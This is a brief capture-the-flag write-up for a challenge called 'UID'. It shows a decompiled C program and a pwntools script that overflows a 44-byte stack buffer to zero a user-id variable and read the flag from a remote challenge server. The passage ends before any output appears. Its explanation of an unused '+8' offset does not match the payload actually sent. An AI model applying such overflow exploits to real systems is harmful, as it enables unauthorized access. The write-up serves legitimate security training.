# UID

For this chall, we had a really simple compiled C code. This code, analysed with Ghidra looked like this:

```c
undefined8 main(void)

{
  undefined local_38 [44];
  __uid_t local_c;
  
  local_c = geteuid();
  printf("username: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_0010200f,local_38);
  if (local_c == 0) {
    system("cat flag.txt");
  }
  else {
    system("cat flop.txt");
  }
  return 0;
}
```

This basically just check if your user id is equal to `0` which is the `root` uid. The length of the string was 44 chars long. So we just need to input `44` chars, followed by a 0 to overwrite the value of the `local_c` variable:

```python
from pwn import *

# offset to return address
offset = 0x44+8

# Start the process
#p = process("./uid")
p = remote('challenges.france-cybersecurity-challenge.fr', 2100)
p.recvuntil("username: ")

# Craft the payload
payload = b"A" * 44 # Fill the buffer until the end of local_38
payload += p64(0)   # Overwrite local_c with 0 (use p64 for 64-bit value)

# Send the payload
p.sendline(payload)

# Print the output
print(p.recvall().decode())
```

> Note that we added `+8` at the offset so that we can overwrite the next address.

This gives us:
